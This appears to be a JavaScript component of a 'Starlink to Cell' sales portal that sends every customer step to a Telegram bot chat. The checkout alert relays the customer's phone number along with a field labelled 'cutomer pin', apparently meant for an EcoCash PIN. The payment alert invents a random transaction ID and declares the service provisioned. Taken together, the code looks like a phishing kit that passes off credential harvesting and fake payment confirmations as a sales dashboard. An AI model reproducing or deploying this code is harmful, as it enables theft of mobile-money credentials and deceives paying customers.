/**
 * ============================================================================
 * Telegram Admin Sales Dashboard Engine
 * Handles real-time transaction alerts, revenue tracking, and sales analytics
 * ============================================================================
 */

const TelegramDashboard = {
  // Local analytics state
  getStats() {
    const raw = localStorage.getItem('starlink_sales_stats');
    if (!raw) {
      return { totalRevenue: 0.00, totalOrders: 0, packagesClicked: 0, checkoutsStarted: 0, date: new Date().toLocaleDateString() };
    }
    try {
      return JSON.parse(raw);
    } catch (e) {
      return { totalRevenue: 0.00, totalOrders: 0, packagesClicked: 0, checkoutsStarted: 0, date: new Date().toLocaleDateString() };
    }
  },

  saveStats(stats) {
    localStorage.setItem('starlink_sales_stats', JSON.stringify(stats));
  },

  /**
   * Send a formatted HTML message to the Telegram Admin Chat
   */
  async sendMessage(htmlText) {
    const cfg = window.TELEGRAM_CONFIG;
    if (!cfg || !cfg.enabled || !cfg.botToken || cfg.botToken === 'YOUR_BOT_TOKEN_HERE') {
      console.info('📊 [Telegram Sales Dashboard - Dry Run]:\n' + htmlText.replace(/<[^>]+>/g, ''));
      return { ok: false, dryRun: true };
    }

    try {
      const endpoint = `https://api.telegram.org/bot${cfg.botToken}/sendMessage`;
      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: cfg.chatId,
          text: htmlText,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });
      const data = await res.json();
      if (!data.ok) {
        console.warn('⚠️ Telegram API Warning:', data.description);
      }
      return data;
    } catch (err) {
      console.error('❌ Failed to reach Telegram API:', err);
      return { ok: false, error: err };
    }
  },

  /**
   * Alert 1: Customer browses / clicks a package
   */
  async notifyPackageSelected(plan) {
    const stats = this.getStats();
    stats.packagesClicked = (stats.packagesClicked || 0) + 1;
    this.saveStats(stats);

    const msg =
      `🛒 <b>CUSTOMER PICKED A PACKAGE</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📦 <b>Package:</b> ${plan.title}\n` +
      `💰 <b>Price:</b> ${plan.price}\n` +
      `⏱ <b>Duration:</b> ${plan.duration}\n` +
      `🏷 <b>Category:</b> ${plan.badge || 'Standard'}\n` +
      `📅 <b>Time:</b> ${new Date().toLocaleTimeString()} • ${new Date().toLocaleDateString()}\n` +
      `🌐 <b>Origin:</b> Starlink to Cell Portal`;

    return await this.sendMessage(msg);
  },

  /**
   * Alert 2: Customer enters phone number and starts EcoCash checkout
   */
  async notifyCheckoutStarted(plan, phone) {
    const stats = this.getStats();
    stats.checkoutsStarted = (stats.checkoutsStarted || 0) + 1;
    this.saveStats(stats);

    const msg =
      `💳 <b>CHECKOUT INITIATED</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Customer Phone:</b> <code>+263 ${phone}</code>\n` +
      `🔑 <b>cutomer pin:</b> <code>input</code>\n` +
      `📦 <b>Package:</b> ${plan.title} (${plan.duration})\n` +
      `💵 <b>Amount:</b> ${plan.price}\n` +
      `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
      `📅 <b>Time:</b> ${new Date().toLocaleTimeString()}\n` +
      `⏳ <b>Status:</b> Awaiting Payment Confirmation`;


    return await this.sendMessage(msg);
  },

  /**
   * Alert 3: Payment Confirmed (Revenue Recorded!)
   */
  async notifyPaymentSuccess(plan, phone, txId) {
    const stats = this.getStats();
    const priceNum = typeof plan.priceNumeric === 'number' ? plan.priceNumeric : parseFloat(plan.price.replace(/[^\d.]/g, '') || 0);

    stats.totalOrders = (stats.totalOrders || 0) + 1;
    stats.totalRevenue = Number((Number(stats.totalRevenue || 0) + priceNum).toFixed(2));
    this.saveStats(stats);

    const generatedTx = txId || 'EC-' + Math.floor(100000000 + Math.random() * 900000000);

    const msg =
      `🎉 <b>PAYMENT CONFIRMED — NEW SALE!</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `💰 <b>Revenue:</b> <b>${plan.price}</b>\n` +
      `📱 <b>Customer:</b> <code>+263 ${phone}</code>\n` +
      `📦 <b>Package:</b> ${plan.title}\n` +
      `⏱ <b>Validity:</b> ${plan.duration}\n` +
      `🆔 <b>TxID:</b> <code>${generatedTx}</code>\n` +
      `📡 <b>Network Status:</b> Direct-to-Cell Provisioned\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📈 <b>Today's Total:</b> USD $${stats.totalRevenue.toFixed(2)} (${stats.totalOrders} sales)\n` +
      `📅 <b>Time:</b> ${new Date().toLocaleTimeString()}`;

    return await this.sendMessage(msg);
  },

  /**
   * Alert 4: Payment Failed / Cancelled
   */
  async notifyPaymentFailed(plan, phone, reason) {
    const msg =
      `⚠️ <b>PAYMENT NOT COMPLETED</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Customer:</b> +263 ${phone}\n` +
      `📦 <b>Package:</b> ${plan.title} (${plan.price})\n` +
      `❌ <b>Reason:</b> ${reason || 'Customer cancelled on USSD / Timeout'}\n` +
      `📅 <b>Time:</b> ${new Date().toLocaleTimeString()}`;

    return await this.sendMessage(msg);
  },

  /**
   * Alert 5: Daily Analytics Summary Report
   */
  async sendDailySummary() {
    const stats = this.getStats();
    const msg =
      `📊 <b>DAILY SALES & REVENUE REPORT</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📅 <b>Date:</b> ${new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'short', day: 'numeric' })}\n` +
      `💰 <b>Gross Revenue:</b> <b>USD $${(stats.totalRevenue || 0).toFixed(2)}</b>\n` +
      `🛍 <b>Successful Orders:</b> ${stats.totalOrders || 0}\n` +
      `💳 <b>Checkouts Started:</b> ${stats.checkoutsStarted || 0}\n` +
      `👀 <b>Package Views:</b> ${stats.packagesClicked || 0}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🌐 <b>Gateway:</b> EcoCash & Starlink to Cell Operational`;

    return await this.sendMessage(msg);
  },

  /**
   * One-click test connection function
   */
  async testConnection() {
    const msg =
      `✅ <b>Telegram Sales Dashboard Connected!</b>\n\n` +
      `Your Telegram bot is successfully wired to your Starlink to Cell portal.\n` +
      `You will receive live alerts for package selections, checkouts, and successful sales.`;

    const res = await this.sendMessage(msg);
    if (res && res.ok) {
      alert('✓ Telegram connection verified! Check your Telegram chat for the welcome alert.');
    } else if (res && res.dryRun) {
      alert('ℹ️ Please set your botToken and chatId in config.js first.');
    } else {
      alert('⚠️ Telegram error: ' + (res.description || 'Could not send message. Check your botToken and chatId.'));
    }
  }
};

window.TelegramDashboard = TelegramDashboard;
